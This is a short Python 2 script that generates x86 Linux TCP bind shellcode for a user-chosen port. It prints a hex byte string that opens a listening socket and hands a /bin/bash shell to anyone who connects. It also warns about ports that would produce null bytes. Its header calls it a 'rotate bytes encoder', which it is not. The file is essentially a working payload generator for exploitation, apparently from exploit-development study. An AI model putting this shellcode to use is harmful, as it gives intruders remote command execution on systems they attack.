#!/usr/bin/python

# Python rotate bytes encoder 
import random
import argparse
import sys
import struct

parser = argparse.ArgumentParser()
parser.add_argument("-p", "--port", help="Please provide an interger between 1 and 65535", type=int, required=True)
args = parser.parse_args()

port = args.port

if port < 1 or port > 65535:
	print "Please pick a valid port number between 1 and 65535"
	sys.exit()
elif port > 0 and port < 1024:
	print "You will need to be root to bind to a lower port"


#convert the decimal value of the port to hex
hex_port = struct.pack('<L',port).encode('hex')[:4]

if str(hex_port)[:2] == "00" or str(hex_port)[2:4] == "00":
	print "*** WARNING!!! Your port number will cause null bytes to be in your shellcode. You may want to use a different port number"

print "Generating TCP bind shellcode for port " + str(port) + "\nThe hex for the port is " + str(hex_port)[2:4]+str(hex_port)[:2]

print "\n\n"

print "Your shellcode is:"
print "\"\\x31\\xc0\\x31\\xdb\\x50\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x31\\xdb\\x53\\x66\\x68\\x" + str(hex_port)[2:4] + "\\x" + str(hex_port)[:2] + "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x50\\x89\\xe1\\xb3\\x02\\xb0\\x66\\xcd\\x80\\x31\\xdb\\x53\\xff\\x31\\x89\\xe1\\xb0\\x66\\xb3\\x04\\xcd\\x80\\x6a\\x10\\x50\\xff\\x31\\x89\\xe1\\xb3\\x05\\xb0\\x66\\xcd\\x80\\x89\\xc3\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\""
